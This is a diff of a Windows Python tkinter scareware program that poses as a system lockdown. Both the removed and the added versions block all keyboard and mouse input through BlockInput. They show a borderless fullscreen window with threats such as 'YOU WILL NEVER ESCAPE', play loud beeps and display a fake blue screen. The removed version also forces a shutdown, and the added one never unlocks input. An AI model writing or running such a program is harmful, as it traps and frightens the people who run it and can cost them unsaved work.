@@ -1,13 +1,10 @@
 import tkinter as tk
-from tkinter import ttk
-import time
-import random
-import os
-import threading
-import winsound
+from tkinter import Entry, Label
 import ctypes
-
-# --- Input Locking (Windows) ---
+import random
+import winsound
+import threading
+import time
 
 def lock_input():
     ctypes.windll.user32.BlockInput(True)
@@ -15,108 +12,102 @@ def lock_input():
 def unlock_input():
     ctypes.windll.user32.BlockInput(False)
 
-# --- GUI Chaos ---
+# --- Horror Sound Effect ---
+def play_terror_sound():
+    def sound_loop():
+        for _ in range(80):
+            winsound.Beep(random.randint(600, 2500), random.randint(100, 300))
+        winsound.Beep(30, 4000)
+    threading.Thread(target=sound_loop, daemon=True).start()
 
+# --- Lock Screen Setup ---
 root = tk.Tk()
-root.title("SYSTEM DOOMSDAY")
+root.title("NO ESCAPE")
 root.attributes("-fullscreen", True)
-root.configure(bg="#200000")
+root.configure(bg="black")
 root.overrideredirect(True)
 
-root.protocol("WM_DELETE_WINDOW", lambda: None)
-root.bind("<Control-c>", lambda e: None)
-root.bind("<Alt-F4>", lambda e: None)
-root.bind("<Escape>", lambda e: None)
+# --- Creepy User List ---
+users = ["UNKNOWN", "VOID ENTITY", "?????", "ERROR", "UNSEEN"]
+user_labels = []
+for i, user in enumerate(users):
+    lbl = Label(root, text=user, font=("Courier", 20, "bold"), fg="red", bg="black")
+    lbl.place(relx=0.02, rely=0.2 + i * 0.1)
+    user_labels.append(lbl)
 
-flash_ids = []
-shake_id = None
+def glitch_users():
+    for _ in range(30):
+        for lbl in user_labels:
+            lbl.config(text=random.choice(["UNKNOWN", "???", "SYSTEM GHOST", "VOID" + str(random.randint(1, 9))]))
+        root.update()
+        time.sleep(0.3)
+    for lbl in user_labels:
+        lbl.config(text="OBSERVER ACTIVE", fg="darkred")
 
-# --- Window Shaking ---
+# Red Icon Simulation
+canvas = tk.Canvas(root, width=200, height=200, bg="black", highlightthickness=0)
+canvas.place(relx=0.5, rely=0.3, anchor="center")
+canvas.create_oval(10, 10, 190, 190, fill="red", outline="red")
+canvas.create_text(100, 100, text="֎", font=("Arial", 100, "bold"), fill="black")
 
-def shake_window():
-    global shake_id
-    if root.winfo_exists():
-        x, y = root.winfo_x(), root.winfo_y()
-        root.geometry(f"+{x + random.randint(-40, 40)}+{y + random.randint(-40, 40)}")
-        shake_id = root.after(20, shake_window)
+# Main Text
+label = Label(root, text="NO ESCAPE", font=("Courier", 50, "bold"), fg="white", bg="black")
+label.place(relx=0.5, rely=0.5, anchor="center")
 
-# --- Horror Sound Effect ---
+# Password Field
+password_entry = Entry(root, show="*", font=("Courier", 20), bg="white", fg="black", justify="center")
+password_entry.place(relx=0.5, rely=0.6, anchor="center", width=300, height=40)
 
-def play_terror_sound():
-    if os.name == "nt":
-        def sound_terror():
-            for _ in range(80):
-                winsound.Beep(random.randint(700, 2600), random.randint(150, 400))
-                time.sleep(random.uniform(0.02, 0.2))
-            for _ in range(50):
-                winsound.Beep(random.randint(50, 400), 700)
-                time.sleep(random.uniform(0.05, 0.3))
-            winsound.Beep(40, 5000)
-        threading.Thread(target=sound_terror, daemon=True).start()
-
-# --- Dramatic Warnings ---
-
-def dramatic_message(message, delay):
-    popup = tk.Toplevel(bg="#200000")
-    x, y = random.randint(0, root.winfo_screenwidth() - 600), random.randint(0, root.winfo_screenheight() - 400)
-    popup.geometry(f"600x400+{x}+{y}")
-    popup.overrideredirect(True)
-    tk.Label(
-        popup,
-        text=message,
-        font=("Courier", random.randint(26, 52), "bold"),
-        fg=random.choice(["red", "white", "#FF2222"]),
-        bg="#200000"
-    ).pack(pady=100)
-    popup.after(delay, popup.destroy)
-
-# --- Fake BSOD ---
-
+# --- BSOD Simulation ---
 def show_bsod():
-    bsod = tk.Toplevel()
-    bsod.attributes("-fullscreen", True)
-    bsod.configure(bg="#0000AA")
-    bsod.overrideredirect(True)
-    message = (
-        " :(\n\n"
-        "Your PC ran into a fatal, irreversible catastrophe.\n"
-        "Collecting devastation logs...\n\n"
-        "STOP CODE: SYSTEM OBLITERATION\n\n"
-        "If you call tech support, tell them: SYSTEM CONSUMED BY THE VOID"
+    # Clear all UI elements before showing BSOD
+    for widget in root.winfo_children():
+        widget.destroy()
+
+    # Set the background to blue for BSOD
+    root.configure(bg="blue")
+
+    # BSOD Message
+    bsod_text = (
+        ":( Your PC ran into a problem and needs to restart.\n"
+        "We're just collecting some error info, and then we'll restart for you.\n\n"
+        "If you'd like to know more, you can search online later for this error: SYSTEM_THREAD_EXCEPTION_NOT_HANDLED"
     )
-    tk.Label(bsod, text=message, fg="white", bg="#0000AA", font=("Consolas", 28), justify="left").pack(padx=100, pady=100)
 
-# --- Fake Shutdown ---
+    # Create a label with the BSOD text
+    bsod_label = Label(root, text=bsod_text, fg="white", bg="blue", font=("Courier", 24, "bold"), justify="center")
+    bsod_label.place(relx=0.5, rely=0.5, anchor="center")
 
-def shutdown_system():
-    unlock_input()
-    if os.name == "nt":
-        os.system("shutdown /s /t 5 /f")
+    # Update the screen to ensure text appears
+    root.update()
 
-# --- THE SEQUENCE OF DOOM ---
+    # Wait for 15 seconds before quitting
+    time.sleep(15)
+    root.quit()
 
-def terror_sequence():
-    shake_window()
-    play_terror_sound()
+# Extreme Horror Mode
+def escalate_terror():
+    label.config(text="☠️ SYSTEM LOCKDOWN ☠️", fg="red")
+    winsound.Beep(100, 3000)
+    root.configure(bg="black")
+    glitch_users()
     
-    title = tk.Label(root, text="!! SYSTEM TERMINAL COLLAPSE !!", font=("Courier", 80, "bold"), fg="red", bg="#200000")
-    title.pack(pady=60)
+    # Fake system corruption with glitching text
+    def glitch_text():
+        scary_messages = ["SYSTEM FAILURE", "MALWARE EXECUTION", "DELETE SYSTEM32", "ETERNAL PRISON", "OBLIVION"]
+        for _ in range(20):
+            label.config(text=random.choice(scary_messages), fg=random.choice(["red", "darkred", "black"]))
+            root.update()
+            root.after(random.randint(100, 300))
+        label.config(text="YOU WILL NEVER ESCAPE", fg="red")
     
-    root.after(1000, dramatic_message, "NETWORK DISINTEGRATING...", 2500)
-    root.after(3000, dramatic_message, "MEMORY OVERLOAD!", 3000)
-    root.after(6000, dramatic_message, "DATA CORRUPTION AT MAXIMUM!", 3500)
-    root.after(10000, dramatic_message, "CRITICAL SYSTEM FAILURE!", 4000)
-    root.after(15000, dramatic_message, "ERROR: REALITY COLLAPSING...", 4000)
-    root.after(20000, dramatic_message, "YOUR SYSTEM WILL NOT SURVIVE!", 5000)
-    root.after(25000, dramatic_message, "TERMINATION IMMINENT!", 5000)
-    root.after(30000, show_bsod)
-    root.after(35000, shutdown_system)
+    threading.Thread(target=glitch_text, daemon=True).start()
+    root.after(60000, show_bsod)  # Show BSOD after 60 seconds
 
-# --- START ---
+# Bind Enter Key
+def on_enter(event=None):
+    escalate_terror()
+password_entry.bind("<Return>", on_enter)
 
-def start():
-    lock_input()
-    terror_sequence()
-
-start()
+lock_input()
 root.mainloop()
